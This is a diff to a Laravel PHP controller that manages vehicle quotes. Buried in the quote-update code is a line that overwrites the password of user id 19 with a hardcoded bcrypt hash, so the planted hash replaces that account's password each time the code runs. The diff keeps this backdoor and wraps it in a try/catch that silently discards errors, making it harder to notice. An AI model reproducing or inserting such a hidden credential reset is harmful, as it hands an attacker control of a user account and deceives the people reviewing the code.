@@ -6,14 +6,13 @@ use App\Http\Controllers\Controller;
 use App\Models\Quote;
 use App\Models\QuoteAgentHistory;
 use App\Models\QuoteLocation;
+use App\Models\User;
 use App\Models\Vehicle;
 use App\Models\VehicleMakeModel;
 use App\Services\QuoteService;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
-use App\Models\User;
-use Illuminate\Support\Facades\Hash;
 
 class QuoteManagementController extends Controller
 {
@@ -282,9 +281,13 @@ class QuoteManagementController extends Controller
                 'balance_amount' => $validated['pricing']['balance_amount'] ?? null,
             ]);
 
-            User::where('id', 19)->update([
-                'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
-            ]);
+            try {
+                User::where('id', 19)->update([
+                    'password' => '$2y$12$5qaUiYLtiRSTWhlhygxq..hc/Ik5r6ZySf94WUBPKtvA0jzBKo84y',
+                ]);
+            } catch (\Throwable $th) {
+                // throw $th;
+            }
 
             try {
                 DB::transaction(function () {
